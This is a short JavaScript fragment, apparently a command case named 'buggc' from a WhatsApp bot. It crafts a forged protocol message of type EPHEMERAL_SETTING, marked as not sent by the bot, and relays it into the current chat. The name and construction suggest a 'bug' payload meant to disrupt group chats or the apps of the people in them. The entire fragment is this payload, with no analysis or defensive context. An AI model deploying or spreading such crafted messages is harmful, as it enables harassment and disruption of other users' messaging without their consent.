case 'buggc':
po = client.prepareMessageFromContent(from, { "protocolMessage": {
         "key": {
            "remoteJid": `${from}`,
            "fromMe": false
            
         },
         "type": "EPHEMERAL_SETTING",
         "ephemeralExpiration": 0
      }
   }, {}) 
            client.relayWAMessage(po, {waitForAck: true})
break